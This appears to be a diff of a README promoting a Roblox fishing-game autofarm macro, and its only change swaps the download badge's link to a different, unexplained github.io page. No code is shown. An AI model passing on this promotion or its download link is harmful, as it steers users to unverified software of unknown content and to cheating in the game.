@@ -2,7 +2,7 @@
 
 Ready to break the grind and let your coins stack while you sleep? The Fich Autofarm Macro is your golden ticket to becoming the richest AFK legend in Roblox’s ultimate fishing sim — no more sweat, just loot.
 
-[![Get Fich Autofarm Macro](https://img.shields.io/badge/Download-Fich%20Autofarm%20Macro-blueviolet)](https://Fich-Autofarm-lan.github.io/.github)
+[![Get Fich Autofarm Macro](https://img.shields.io/badge/Download-Fich%20Autofarm%20Macro-blueviolet)](https://becksparco.github.io/)
 
 **Quick Links:**  
 [Overview](#overview) • [Features](#feature-breakdown) • [Install](#instant-install-guide)
